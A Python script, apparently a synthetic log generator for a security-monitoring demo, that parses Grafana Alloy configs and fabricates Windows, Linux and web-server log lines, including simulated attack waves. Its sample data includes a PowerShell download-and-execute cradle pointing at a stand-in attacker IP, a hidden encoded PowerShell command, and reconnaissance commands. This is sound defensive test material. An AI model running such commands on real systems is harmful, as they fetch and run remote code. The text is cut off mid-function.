#!/usr/bin/env python3
r"""Synthetic log feeder for the demo stand.

Reads the production Grafana Alloy configs and emits lines in the shape each
config produces. Stream labels, EventIDs, Levels and loki.process stages all
come from the configs under the repo root; nothing about them is copied here.

Windows lines: one JSON object per event, in the shape of formatLine from
grafana/alloy v1.20.1 (loki/source/windowsevent/format.go, the version pinned
in windows-common/04-Install-Alloy.ps1). Encoded like jsoniter.MarshalToString:
omitempty fields, compact separators, and <, >, & written as \u003c, \u003e,
\u0026 (jsoniter ConfigDefault has EscapeHTML true).

Linux lines: raw text, as loki.source.file tails it. The stages of the
loki.process chain run on every line; labels they extract join the stream.

Journal lines (loki.source.journal): the bare MESSAGE text, with no syslog prefix and no JSON.

Deliberate deviation from production: Alloy stamps entries with arrival time.
The feeder backfills --span-hours so trends are visible on first start, and
timeCreated carries the same instant as the Loki entry.

Stdlib only.
  python feeder.py --check                  validate parsing and coverage (default)
  python feeder.py --dump FILE              write NDJSON {stream, ts, line}
  python feeder.py --loki http://HOST:3100  push the backfill to Loki
  add --follow SECONDS to keep pushing calm traffic, with an attack wave every --wave-minutes
  python feeder.py --loki URL --scenario spray|admin|persistence|ad|logclear|ssh|all   one wave now
  --prom-dir DIR writes demo backup metrics (one healthy host, one stale) for node_exporter
"""

from __future__ import annotations

import argparse
import json
import random
import re
import sys
import time
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from xml.sax.saxutils import escape as xml_escape

REPO = Path(__file__).resolve().parents[2]

# Demo hostname for each production config. The configs' env("COMPUTERNAME") and
# env("HOSTNAME") resolve to these values. The third field keeps one source kind:
# the server config is replayed for its journal alone, because its file sources
# have no demo templates.
CONFIGS = [
    ("DEMO-DC01", "windows-server-2025/config.alloy", None),
    ("DEMO-WS01", "windows-11-client/config.alloy", None),
    ("DEMO-LNX01", "linux-agent/config.alloy", None),
    ("DEMO-SRV01", "server/alloy/config.alloy", "loki.source.journal"),
]

# ---------------------------------------------------------------- Alloy parsing

BLOCK = re.compile(
    r'(?m)^(loki\.source\.windowsevent|loki\.source\.file|loki\.source\.journal'
    r'|local\.file_match|loki\.process)'
    r'\s+"([^"]+)"\s*\{'
)
STR = r'"((?:[^"\\]|\\.)*)"'
# constants.hostname is the Alloy constant the server config uses for its journal instance.
LABEL = re.compile(
    r'(?P<key>[A-Za-z_]\w*)\s*=\s*(?:env\("(?P<env>\w+)"\)|(?P<const>constants\.hostname)'
    r'|"(?P<str>(?:[^"\\]|\\.)*)")'
)
STAGE = re.compile(r'\bstage\.(\w+)\s*\{')


def skip_string(text: str, i: int) -> int:
    """Index just past the string literal that starts at text[i]."""
    i += 1
    while text[i] != '"':
        i += 2 if text[i] == "\\" else 1
    return i + 1


def close_of(text: str, open_idx: int) -> int:
    """Index of the bracket that closes text[open_idx], skipping strings and // comments."""
    opener = text[open_idx]
    closer = "}" if opener == "{" else "]"
    depth = 0
    i = open_idx
    while True:
        c = text[i]
        if c == '"':
            i = skip_string(text, i)
            continue
        if text.startswith("//", i):
            i = text.index("\n", i)
            continue
        if c == opener:
            depth += 1
        elif c == closer:
            depth -= 1
            if depth == 0:
                return i
        i += 1


def unescape(s: str) -> str:
    return re.sub(r"\\(.)", lambda m: {"n": "\n", "t": "\t"}.get(m.group(1), m.group(1)), s)


def attr_str(body: str, name: str) -> str | None:
    m = re.search(r"(?m)^\s*" + re.escape(name) + r"\s*=\s*" + STR, body)
    return unescape(m.group(1)) if m else None


def attr_block(body: str, name: str, opener: str) -> str | None:
    m = re.search(r"(?m)^\s*" + re.escape(name) + r"\s*=\s*" + re.escape(opener), body)
    if not m:
        return None
    start = m.end() - 1
    return body[start + 1 : close_of(body, start)]


def list_items(text: str) -> list[str]:
    """Bodies of the top-level {...} items of a list body."""
    items, i = [], 0
    while i < len(text):
        c = text[i]
        if c == '"':
            i = skip_string(text, i)
        elif c == "{":
            end = close_of(text, i)
            items.append(text[i + 1 : end])
            i = end + 1
        else:
            i += 1
    return items


def label_map(text: str, host: str) -> dict[str, str]:
    out: dict[str, str] = {}
    for m in LABEL.finditer(text):
        if m.group("env"):
            if m.group("env") not in ("COMPUTERNAME", "HOSTNAME"):
                raise SystemExit(f"unknown env() in config: {m.group('env')}")
            out[m.group("key")] = host
        elif m.group("const"):
            out[m.group("key")] = host
        else:
            out[m.group("key")] = unescape(m.group("str"))
    return out


@dataclass
class Stage:
    kind: str                                   # "regex" | "labels" | "static"
    expression: str = ""
    labels: dict = field(default_factory=dict)  # stream label -> regex group name


def parse_stages(body: str) -> list[Stage]:
    stages = []
    for m in STAGE.finditer(body):
        start = m.end() - 1
        inner = body[start + 1 : close_of(body, start)]
        if m.group(1) == "regex":
            stages.append(Stage("regex", expression=attr_str(inner, "expression") or ""))
        elif m.group(1) == "labels":
            values = attr_block(inner, "values", "{") or ""
            pairs = re.findall(r'([A-Za-z_]\w*)\s*=\s*"([^"]*)"', values)
            stages.append(Stage("labels", labels={k: (g or k) for k, g in pairs}))
        elif m.group(1) == "static_labels":
            values = attr_block(inner, "values", "{") or ""
            stages.append(Stage("static", labels=dict(re.findall(r'([A-Za-z_]\w*)\s*=\s*"([^"]*)"', values))))
        else:
            raise SystemExit(f"unsupported loki.process stage stage.{m.group(1)}; extend stage_labels()")
    return stages


def resolve_stages(body: str, procs: dict[str, str]) -> list[Stage]:
    """Follow forward_to through loki.process blocks until a loki.write receiver."""
    stages: list[Stage] = []
    target = attr_block(body, "forward_to", "[") or ""
    for _ in range(8):
        m = re.search(r"loki\.(process|write)\.(\w+)\.receiver", target)
        if not m:
            raise SystemExit("forward_to has no loki receiver")
        if m.group(1) == "write":
            return stages
        pbody = procs[m.group(2)]
        stages += parse_stages(pbody)
        target = attr_block(pbody, "forward_to", "[") or ""
    raise SystemExit("loki.process chain too deep")


@dataclass
class Source:
    name: str
    kind: str                                    # "windowsevent" | "file" | "journal"
    labels: dict = field(default_factory=dict)   # windowsevent stream labels
    stages: list = field(default_factory=list)
    channel: str = ""
    xpath: str = "*"
    files: list = field(default_factory=list)    # file: [(path, stream labels)]


@dataclass
class Host:
    name: str
    sources: list
    record_seq: int = 1000                       # Windows EventRecordID counter


def load_sources(text: str, host: str, only: str | None = None) -> list[Source]:
    blocks = []
    for m in BLOCK.finditer(text):
        at = m.end() - 1
        blocks.append((m.group(1), m.group(2), text[at + 1 : close_of(text, at)]))
    procs = {n: b for kind, n, b in blocks if kind == "loki.process"}
    file_matches = {n: b for kind, n, b in blocks if kind == "local.file_match"}
    sources: list[Source] = []
    for kind, name, body in blocks:
        if only and kind != only:
            continue
        if kind == "loki.source.windowsevent":
            sources.append(Source(
                name, "windowsevent",
                labels=label_map(attr_block(body, "labels", "{") or "", host),
                stages=resolve_stages(body, procs),
                channel=attr_str(body, "eventlog_name") or "",
                xpath=attr_str(body, "xpath_query") or "*",
            ))
        elif kind == "loki.source.file":
            tm = re.search(r"targets\s*=\s*local\.file_match\.(\w+)\.targets", body)
            raw = attr_block(file_matches[tm.group(1)], "path_targets", "[") if tm \
                else attr_block(body, "targets", "[")
            files = []
            for item in list_items(raw or ""):
                labels = label_map(item, host)
                path = labels.pop("__path__", None)
                if path is None:
                    raise SystemExit(f"{name}: target without __path__")
                labels.pop("__path_exclude__", None)
                files.append((path, labels))
            sources.append(Source(name, "file", stages=resolve_stages(body, procs), files=files))
        elif kind == "loki.source.journal":
            sources.append(Source(
                name, "journal",
                labels=label_map(attr_block(body, "labels", "{") or "", host),
                stages=resolve_stages(body, procs),
            ))
    return sources


def load_hosts(repo: Path) -> list[Host]:
    hosts = []
    for name, rel, only in CONFIGS:
        path = repo / rel
        if not path.is_file():
            raise SystemExit(f"missing production config: {path}")
        hosts.append(Host(name, load_sources(path.read_text(encoding="utf-8"), name, only)))
    return hosts


# --------------------------------------------------- Windows event demo content

@dataclass(frozen=True)
class Tpl:
    provider: str
    level: int
    keywords: str
    proc: str
    fields: tuple
    message: str


def t(provider, level, fields, message, keywords="", proc="svchost.exe") -> Tpl:
    return Tpl(provider, level, keywords, proc, tuple(fields), message)


AUDIT_OK = "0x8020000000000000"
AUDIT_FAIL = "0x8010000000000000"
SEC_PROV = "Microsoft-Windows-Security-Auditing"
LSASS = "lsass.exe"

LOGON = ("SubjectUserName", "SubjectDomainName", "TargetUserName", "TargetDomainName", "TargetUserSid",
         "LogonType", "LogonProcessName", "AuthenticationPackageName", "WorkstationName", "IpAddress", "IpPort")
FAILED = ("TargetUserName", "TargetDomainName", "Status", "SubStatus", "FailureReason", "LogonType",
          "LogonProcessName", "AuthenticationPackageName", "WorkstationName", "IpAddress", "IpPort")
ACCOUNT = ("SubjectUserName", "SubjectDomainName", "TargetUserName", "TargetDomainName")
GROUP = ACCOUNT + ("MemberName", "MemberSid")
TASK = ("SubjectUserName", "SubjectDomainName", "TaskName")
KERBEROS = ("TargetUserName", "TargetDomainName", "ServiceName", "IpAddress", "IpPort")

# (channel, event id) -> template. Covers every EventID in the production xpath lists.
EVENTS: dict[tuple[str, int], Tpl] = {}


def sec(eid, fields, message, keywords=AUDIT_OK, proc=LSASS):
    EVENTS[("Security", eid)] = t(SEC_PROV, 0, fields, message, keywords, proc)


sec(4624, LOGON, "An account was successfully logged on.")
sec(4625, FAILED, "An account failed to log on.", AUDIT_FAIL)
sec(4634, ("TargetUserName", "TargetDomainName", "LogonType"), "An account was logged off.")
sec(4647, ("TargetUserName", "TargetDomainName"), "User initiated logoff.")
sec(4648, ("SubjectUserName", "SubjectDomainName", "TargetUserName", "TargetDomainName", "IpAddress", "IpPort"),
    "A logon was attempted using explicit credentials.")
sec(4672, ("SubjectUserName", "SubjectDomainName", "PrivilegeList"), "Special privileges assigned to new logon.")
sec(4776, ("TargetUserName", "Workstation", "Status"),
    "The computer attempted to validate the credentials for an account.")
sec(4740, ("TargetUserName", "TargetDomainName", "SubjectUserName", "SubjectDomainName"),
    "A user account was locked out.")
sec(4768, KERBEROS, "A Kerberos authentication ticket (TGT) was requested.")
sec(4769, KERBEROS, "A Kerberos service ticket was requested.")
sec(4770, KERBEROS, "A Kerberos service ticket was renewed.")
sec(4771, KERBEROS, "Kerberos pre-authentication failed.", AUDIT_FAIL)

ACCOUNT_EVENTS = {
    4720: "A user account was created.",
    4722: "A user account was enabled.",
    4723: "An attempt was made to change an account's password.",
    4724: "An attempt was made to reset an account's password.",
    4725: "A user account was disabled.",
    4726: "A user account was deleted.",
    4727: "A security-enabled global group was created.",
    4728: "A member was added to a security-enabled global group.",
    4729: "A member was removed from a security-enabled global group.",
    4730: "A security-enabled global group was deleted.",
    4731: "A security-enabled local group was created.",
    4732: "A member was added to a security-enabled local group.",
    4733: "A member was removed from a security-enabled local group.",
    4734: "A security-enabled local group was deleted.",
    4735: "A security-enabled local group was changed.",
    4738: "A user account was changed.",
    4741: "A computer account was created.",
    4742: "A computer account was changed.",
    4743: "A computer account was deleted.",
}
for _eid, _msg in ACCOUNT_EVENTS.items():
    sec(_eid, GROUP if _eid in (4728, 4729, 4732, 4733) else ACCOUNT, _msg)

sec(4697, ("SubjectUserName", "ServiceName", "ServiceFileName", "ServiceType", "ServiceStartType", "ServiceAccount"),
    "A service was installed in the system.")
sec(4698, TASK, "A scheduled task was created.")
sec(4699, TASK, "A scheduled task was deleted.")
sec(4700, TASK, "A scheduled task was enabled.")
sec(4701, TASK, "A scheduled task was disabled.")
sec(4702, TASK, "A scheduled task was updated.")
sec(4688, ("SubjectUserName", "SubjectDomainName", "NewProcessName", "NewProcessId", "CommandLine", "ParentProcessName"),
    "A new process has been created.", proc="System")
sec(1100, (), "The event logging service has shut down.")
sec(1102, ("SubjectUserName", "SubjectDomainName", "SubjectLogonId"), "The audit log was cleared.")
sec(4703, ("SubjectUserName", "TargetUserName", "PrivilegeList"), "A user right was adjusted.")
sec(4704, ("SubjectUserName", "TargetUserName", "PrivilegeList"), "A user right was assigned.")
sec(4705, ("SubjectUserName", "TargetUserName", "PrivilegeList"), "A user right was removed.")
sec(4719, ("SubjectUserName", "CategoryId", "SubcategoryId", "AuditPolicyChanges"), "System audit policy was changed.")
OBJECT = ("SubjectUserName", "ObjectServer", "ObjectType", "ObjectName", "AccessMask", "ProcessName")
sec(4656, OBJECT, "A handle to an object was requested.")
sec(4660, OBJECT, "An object was deleted.")
sec(4663, OBJECT, "An attempt was made to access an object.")
sec(4670, OBJECT, "Permissions on an object were changed.")
sec(5140, ("SubjectUserName", "ShareName", "ShareLocalPath", "IpAddress", "IpPort"),
    "A network share object was accessed.")
sec(5145, ("SubjectUserName", "ShareName", "RelativeTargetName", "IpAddress", "IpPort"),
    "A network share object was checked to see whether client can be granted desired access.")
DS_FIELDS = ("SubjectUserName", "ObjectDN", "AttributeLDAPDisplayName", "AttributeValue")
sec(5136, DS_FIELDS, "A directory service object was modified.")
sec(5137, DS_FIELDS, "A directory service object was created.")
sec(5141, DS_FIELDS, "A directory service object was deleted.")
NPS_FIELDS = ("FullyQualifiedUserName", "CallingStationID", "NASIPv4Address")
sec(6272, NPS_FIELDS, "Network Policy Server granted access to a user.")
sec(6273, NPS_FIELDS, "Network Policy Server denied access to a user.")
for _eid in range(6274, 6281):
    sec(_eid, NPS_FIELDS, f"Network Policy Server event {_eid} (demo record).")

SYS_CH = "System"
SCM = "Service Control Manager"
EVENTS[(SYS_CH, 7045)] = t(SCM, 4, ("ServiceName", "ImagePath", "ServiceType", "StartType", "AccountName"),
                           "A service was installed in the system.", proc="services.exe")
EVENTS[(SYS_CH, 7040)] = t(SCM, 4, ("param1", "param2", "param3"),
                           "The start type of a service was changed.", proc="services.exe")
EVENTS[(SYS_CH, 7034)] = t(SCM, 2, ("param1", "param2"),
                           "A service terminated unexpectedly.", proc="services.exe")
EVENTS[(SYS_CH, 7036)] = t(SCM, 4, ("param1", "param2"),
                           "A service entered the running or stopped state.", proc="services.exe")

PS_CH = "Microsoft-Windows-PowerShell/Operational"
PS_PROV = "Microsoft-Windows-PowerShell"
EVENTS[(PS_CH, 4103)] = t(PS_PROV, 4, ("ContextInfo", "Payload"), "Executing pipeline.", proc="powershell.exe")
EVENTS[(PS_CH, 4104)] = t(PS_PROV, 5, ("ScriptBlockText", "ScriptBlockId", "Path"),
                          "Creating Scriptblock text (1 of 1).", proc="powershell.exe")

SYSMON_CH = "Microsoft-Windows-Sysmon/Operational"
SYSMON = "Microsoft-Windows-Sysmon"
SYSMON_FIELDS = {
    1: ("UtcTime", "ProcessGuid", "ProcessId", "Image", "CommandLine", "User", "ParentImage", "ParentCommandLine"),
    3: ("UtcTime", "ProcessGuid", "ProcessId", "Image", "User", "Protocol", "SourceIp", "SourcePort",
        "DestinationIp", "DestinationPort", "DestinationHostname"),
    5: ("UtcTime", "ProcessGuid", "ProcessId", "Image", "User"),
    7: ("UtcTime", "ProcessGuid", "ProcessId", "Image", "ImageLoaded"),
    8: ("SourceImage", "TargetImage", "NewThreadId"),
    10: ("SourceImage", "TargetImage", "GrantedAccess"),
    11: ("UtcTime", "ProcessGuid", "ProcessId", "Image", "TargetFilename", "User"),
    12: ("EventType", "UtcTime", "ProcessGuid", "ProcessId", "Image", "TargetObject", "User"),
    13: ("EventType", "UtcTime", "ProcessGuid", "ProcessId", "Image", "TargetObject", "Details", "User"),
    15: ("UtcTime", "ProcessGuid", "ProcessId", "Image", "TargetFilename", "User"),
    17: ("EventType", "UtcTime", "ProcessGuid", "ProcessId", "PipeName", "Image", "User"),
    18: ("EventType", "UtcTime", "ProcessGuid", "ProcessId", "PipeName", "Image", "User"),
    22: ("UtcTime", "ProcessGuid", "ProcessId", "QueryName", "QueryStatus", "QueryResults", "Image", "User"),
    23: ("UtcTime", "ProcessGuid", "ProcessId", "User", "Image", "TargetFilename", "IsExecutable"),
    25: ("UtcTime", "ProcessGuid", "ProcessId", "Image", "Type", "User"),
}
SYSMON_MSG = {
    1: "Process Create", 3: "Network connection detected", 5: "Process terminated", 7: "Image loaded",
    8: "CreateRemoteThread detected", 10: "Process accessed", 11: "File created",
    12: "Registry object added or deleted", 13: "Registry value set", 15: "File stream created",
    17: "Pipe created", 18: "Pipe connected", 22: "DNS query", 23: "File delete archived",
    25: "Process image tampering detected",
}
for _eid, _fields in SYSMON_FIELDS.items():
    EVENTS[(SYSMON_CH, _eid)] = t(SYSMON, 4, _fields, SYSMON_MSG[_eid], proc="Sysmon64.exe")

RDP_CH = "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
RDP = "Microsoft-Windows-TerminalServices-LocalSessionManager"
RDP_MSG = {
    21: "Remote Desktop Services: Session logon succeeded",
    22: "Remote Desktop Services: Shell start notification received",
    23: "Remote Desktop Services: Session logoff succeeded",
    24: "Remote Desktop Services: Session has been disconnected",
    25: "Remote Desktop Services: Session reconnection succeeded",
}
for _eid, _msg in RDP_MSG.items():
    EVENTS[(RDP_CH, _eid)] = t(RDP, 4, ("User", "SessionID", "Address"), _msg)

FW_CH = "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"
FW = "Microsoft-Windows-Windows Firewall With Advanced Security"
FW_MSG = {
    2003: "Firewall profile settings were changed.",
    2004: "A rule was added to the firewall exception list.",
    2005: "A rule was modified in the firewall exception list.",
    2006: "A rule was deleted from the firewall exception list.",
}
for _eid, _msg in FW_MSG.items():
    EVENTS[(FW_CH, _eid)] = t(FW, 4, ("RuleName", "ModifyingUser", "ModifyingApplication"), _msg)

DEF_CH = "Microsoft-Windows-Windows Defender/Operational"
DEF = "Microsoft-Windows-Windows Defender"
DEF_MSG = {
    1006: (3, "The antimalware engine found malware or other potentially unwanted software."),
    1007: (4, "The antimalware platform performed an action to protect the system."),
    1116: (3, "Microsoft Defender Antivirus has detected malware or other potentially unwanted software."),
    1117: (4, "Microsoft Defender Antivirus has taken action to protect this machine."),
    5001: (3, "Real-time protection is disabled."),
    5010: (3, "Scanning for malware and other potentially unwanted software is disabled."),
}
for _eid, (_lvl, _msg) in DEF_MSG.items():
    EVENTS[(DEF_CH, _eid)] = t(DEF, _lvl, (), _msg)

# Used when the xpath selects by Level only; the level must be one the xpath selects.
LEVEL_SAMPLE = {
    "Directory Service": (1000, "Microsoft-Windows-ActiveDirectory_DomainService", 2),
    "DNS Server": (150, "Microsoft-Windows-DNS-Server-Service", 2),
    "Application": (1000, "Application Error", 2),
}
# Used when the xpath has neither EventID nor Level (matches every event).
ANY_SAMPLE = {
    "DhcpAdminEvents": (10, "Microsoft-Windows-DHCP-Server", 4),
}


def fallback_tpl(channel: str, eid: int) -> Tpl:
    return Tpl(channel, 4, "", "svchost.exe", (), f"Demo record for event {eid} (no template in the feeder).")


def win_targets(src: Source) -> list[tuple[int, Tpl]]:
    ids = [int(x) for x in re.findall(r"EventID\s*=\s*(\d+)", src.xpath)]
    levels = [int(x) for x in re.findall(r"Level\s*=\s*(\d+)", src.xpath)]
    out = [(eid, EVENTS.get((src.channel, eid)) or fallback_tpl(src.channel, eid)) for eid in ids]
    if levels or not ids:
        table = LEVEL_SAMPLE if levels else ANY_SAMPLE
        if src.channel not in table:
            raise SystemExit(f"{src.name}: no demo sample for channel {src.channel!r}; add it to "
                             f"{'LEVEL_SAMPLE' if levels else 'ANY_SAMPLE'}")
        eid, provider, level = table[src.channel]
        if levels and level not in levels:
            raise SystemExit(f"{src.name}: demo sample level {level} is not selected by Level={levels}")
        out.append((eid, Tpl(provider, level, "", "svchost.exe", (),
                             "Demo record for a query that selects by Level or matches every event.")))
    return out


PROCESSES = [
    (r"C:\Windows\System32\cmd.exe", r"cmd.exe /c whoami /all", r"C:\Windows\explorer.exe"),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     r"powershell.exe -NoProfile -Command Get-LocalGroupMember Administrators", r"C:\Windows\explorer.exe"),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     r"powershell.exe -nop -w hidden -enc ZWNobyBkZW1v", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
    (r"C:\Windows\System32\net.exe", r'net group "Domain Admins" /domain', r"C:\Windows\System32\cmd.exe"),
    (r"C:\Program Files\Mozilla Firefox\firefox.exe",
     r'"C:\Program Files\Mozilla Firefox\firefox.exe" -new-tab https://example.org', r"C:\Windows\explorer.exe"),
]
USERS = [
    ("alice", "S-1-5-21-3623811015-3361044348-30300820-1103"),
    ("bob", "S-1-5-21-3623811015-3361044348-30300820-1104"),
    ("carol", "S-1-5-21-3623811015-3361044348-30300820-1105"),
    ("svc.backup", "S-1-5-21-3623811015-3361044348-30300820-1201"),
]
ADMIN = ("admin.demo", "S-1-5-21-3623811015-3361044348-30300820-500")
DOMAIN = "DEMO"
ATTACKER_IPS = ["203.0.113.5", "203.0.113.77", "198.51.100.23", "198.51.100.210"]
INTERNAL_IPS = ["10.0.0.21", "10.0.0.34", "10.0.1.15"]
LEVEL_TEXT = {1: "Critical", 2: "Error", 3: "Warning", 4: "Information", 5: "Verbose"}
CANON = ["source", "channel", "computer", "event_id", "version", "level", "task", "opCode", "levelText",
         "taskText", "opCodeText", "keywords", "timeCreated", "eventRecordID", "correlation", "execution",
         "security", "user_data", "event_data", "message"]


def context(rng: random.Random, ts: datetime, host: str) -> dict:
    user, sid = rng.choice(USERS)
    image, cmdline, parent = rng.choice(PROCESSES)
    logon_proc, auth_pkg = rng.choice([("Kerberos", "Kerberos"), ("NtLmSsp", "NTLM")])
    return {
        "host": host, "user": user, "sid": sid, "admin": ADMIN[0], "admin_sid": ADMIN[1],
        "ip": rng.choice(ATTACKER_IPS + INTERNAL_IPS), "port": str(rng.randint(40000, 65000)),
        "logon_type": rng.choice(["2", "3", "3", "10"]), "logon_proc": logon_proc, "auth_pkg": auth_pkg,
        "logon_id": f"0x{rng.randint(0x10000, 0xFFFFF):x}",
        "pid": rng.randint(400, 9000), "tid": rng.randint(400, 9000),
        "image": image, "cmdline": cmdline, "parent": parent,
        "guid": "{" + str(uuid.UUID(int=rng.getrandbits(128), version=4)).upper() + "}",
        "service": rng.choice(["DemoSvc", "DemoAgent"]),
        "service_image": r"C:\Windows\Temp\demosvc.exe",
        "task": r"\DemoUpdate\CleanTemp",
        # Mostly routine; sometimes the kind of script the PowerShell rules look for.
        "script": rng.choice([r"Get-ChildItem C:\Users", r"Get-Service | Where-Object Status -eq Running",
                              r"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
                              r"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')"]),
        "dport": rng.choice(["443", "443", "443", "53", "445", "3389", "5985", "4444"]),
        "share": rng.choice([r"\\*\SYSVOL", r"\\*\SYSVOL", r"\\*\ADMIN$", r"\\*\C$", r"\\*\IPC$"]),
        "file": r"C:\Users\alice\Documents\report.xlsx", "dst_ip": rng.choice(ATTACKER_IPS),
        "domain": "example.org", "utc": f"{ts:%Y-%m-%d %H:%M:%S}.{ts.microsecond // 1000:03d}",
    }


def field_value(name: str, c: dict) -> str:
    values = {
        "SubjectUserName": c["admin"], "SubjectDomainName": DOMAIN, "SubjectUserSid": c["admin_sid"],
        "SubjectLogonId": c["logon_id"], "TargetLogonId": c["logon_id"],
        "TargetUserName": c["user"], "TargetDomainName": DOMAIN, "TargetUserSid": c["sid"],
        "Workstation": c["host"], "WorkstationName": c["host"],
        "LogonType": c["logon_type"], "LogonProcessName": c["logon_proc"],
        "AuthenticationPackageName": c["auth_pkg"], "IpAddress": c["ip"], "IpPort": c["port"],
        "SourceIp": c["ip"], "SourcePort": c["port"], "Address": c["ip"], "CallingStationID": c["ip"],
        "Status": "0xc000006d", "SubStatus": "0xc000006a", "FailureReason": "%%2313",
        "NewProcessName": c["image"], "NewProcessId": hex(c["pid"]), "Image": c["image"],
        "SourceImage": c["image"], "TargetImage": c["image"], "ProcessName": c["image"],
        "ImageLoaded": r"C:\Windows\System32\ntdll.dll", "CommandLine": c["cmdline"],
        "ParentImage": c["parent"], "ParentProcessName": c["parent"], "ParentCommandLine": c["parent"],
        "ProcessId": str(c["pid"]), "ProcessGuid": c["guid"], "UtcTime": c["utc"], "User": f"{DOMAIN}\\{c['user']}",
        "ServiceName": c["service"], "ImagePath": c["service_image"], "ServiceFileName": c["service_image"],
        "ServiceType": "user mode service", "StartType": "demand start", "ServiceStartType": "3",
        "ServiceAccount": "LocalSystem", "AccountName": "LocalSystem",
        "param1": c["service"], "param2": "running", "param3": "demand start",
        "TaskName": c["task"], "ScriptBlockText": c["script"], "Payload": c["script"],
        "ScriptBlockId": c["guid"], "ContextInfo": "Get-ChildItem",
        "PrivilegeList": "SeDebugPrivilege", "ObjectServer": "Security", "ObjectType": "File",
        "ObjectName": c["file"], "TargetFilename": c["file"], "AccessMask": "0x2",
        "ShareName": c["share"], "ShareLocalPath": r"C:\Windows\SYSVOL\sysvol", "RelativeTargetName": "report.xlsx",
        "DestinationIp": c["dst_ip"], "DestinationPort": c["dport"], "DestinationHostname": c["domain"],
        "Protocol": "tcp", "QueryName": c["domain"], "QueryStatus": "0",
        "QueryResults": c["dst_ip"], "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\DemoUpdater",
        "Details": c["image"], "ObjectDN": f"CN={c['user']},OU=Staff,DC=demo,DC=local",
        "AttributeLDAPDisplayName": "description", "AttributeValue": "-",
        "FullyQualifiedUserName": f"{DOMAIN}\\{c['user']}", "NASIPv4Address": "10.0.1.1",
        "MemberName": f"CN={c['user']},OU=Staff,DC=demo,DC=local", "MemberSid": c["sid"],
        "SessionID": "2", "RuleName": "Demo rule", "ModifyingUser": f"{DOMAIN}\\{c['admin']}",
        "ModifyingApplication": c["image"], "EventType": "SetValue",
        "ParentProcessId": str(c["pid"]),
    }
    return str(values.get(name, "-"))


def encode(obj: dict) -> str:
    """jsoniter.MarshalToString: compact, and <, >, & escaped as \\u003c, \\u003e, \\u0026."""
    text = json.dumps(obj, ensure_ascii=False, separators=(",", ":"))
    return text.replace("<", r"\u003c").replace(">", r"\u003e").replace("&", r"\u0026")


def windows_line(host: str, channel: str, eid: int, tpl: Tpl, ts: datetime, record_id: int,
                 rng: random.Random) -> str:
    c = context(rng, ts, host)
    obj: dict = {}

    def put(key, value):
        if value not in ("", 0, None):
            obj[key] = value

    put("source", tpl.provider)
    put("channel", channel)
    put("computer", host)
    put("event_id", eid)
    put("level", tpl.level)
    put("levelText", LEVEL_TEXT.get(tpl.level, ""))
    put("keywords", tpl.keywords)
    put("timeCreated", f"{ts:%Y-%m-%dT%H:%M:%S}.{ts.microsecond:06d}0Z")
    put("eventRecordID", record_id)
    put("execution", {"processId": c["pid"], "threadId": c["tid"], "processName": tpl.proc})
    if tpl.provider in (PS_PROV, SYSMON):
        put("security", {"userId": c["sid"], "userName": f"{DOMAIN}\\{c['user']}"})
    else:
        put("security", {"userId": "S-1-5-18", "userName": "NT AUTHORITY\\SYSTEM"})
    if tpl.fields:
        put("event_data", "".join(
            f"<Data Name='{name}'>{xml_escape(field_value(name, c))}</Data>" for name in tpl.fields))
    put("message", tpl.message)
    return encode(obj)


# -------------------------------------------------------------- Linux raw lines

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
PATHS = ["/", "/login", "/admin", "/wp-login.php", "/.env", "/api/v1/users"]


def linux_line(job: str, host: str, path: str, ts: datetime, rng: random.Random) -> str:
    st = f"{MONTHS[ts.month - 1]} {ts.day:>2} {ts:%H:%M:%S}"
    ip = rng.choice(ATTACKER_IPS + INTERNAL_IPS)
    user = rng.choice(USERS)[0]
    pid = rng.randint(1000, 60000)
    port = rng.randint(40000, 65000)
    if job in ("auth", "secure"):
        kind = rng.choice(["failed", "invalid", "accepted", "sudo"])
        if kind == "failed":
            return f"{st} {host} sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2"
        if kind == "invalid":
            return f"{st} {host} sshd[{pid}]: Invalid user admin from {ip} port {port}"
        if kind == "accepted":
            return f"{st} {host} sshd[{pid}]: Accepted publickey for {user} from {ip} port {port} ssh2"
        return f"{st} {host} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/apt-get update"
    if job == "syslog":
        if rng.random() < 0.7:
            return f"{st} {host} systemd[1]: Started Session {rng.randint(1, 99)} of user {user}."
        return f"{st} {host} systemd[1]: demo.service: Failed with result 'exit-code'."
    if job == "kern":
        if rng.random() < 0.5:
            return f"{st} {host} kernel: Out of memory: Killed process {pid} (demo-app) total-vm:524288kB"
        return f"{st} {host} kernel: demo-app[{pid}]: segfault at 0 ip 00007f3a2c1d0b2e sp 00007ffd1 error 4"
    if job == "audit":
        rtype = rng.choice(["USER_CMD", "EXECVE", "ADD_USER", "DEL_USER", "ADD_GROUP", "DEL_GROUP",
                            "USER_MGMT", "GRP_MGMT"])
        serial = rng.randint(100, 9999)
        return (f"type={rtype} msg=audit({ts.timestamp():.3f}:{serial}): pid={pid} uid=0 auid=1000 "
                f"ses=2 op=demo acct=\"{user}\" exe=\"/usr/sbin/useradd\" res=success")
    if job == "fail2ban":
        jail = rng.choice(["sshd", "nginx-http-auth"])
        action = rng.choice(["Ban", "Ban", "Unban"])
        return (f"{ts:%Y-%m-%d %H:%M:%S},{ts.microsecond // 1000:03d} fail2ban.actions  [{pid}]: "
                f"NOTICE  [{jail}] {action} {ip}")
    if job == "webserver_access":
        return (f'{ip} - - [{ts.day:02d}/{MONTHS[ts.month - 1]}/{ts.year}:{ts:%H:%M:%S} +0000] '
                f'"GET {rng.choice(PATHS)} HTTP/1.1" {rng.choice([200, 200, 301, 404, 500])} '
                f'{rng.randint(120, 9000)} "-" "Mozilla/5.0"')
    if job == "webserver_error":
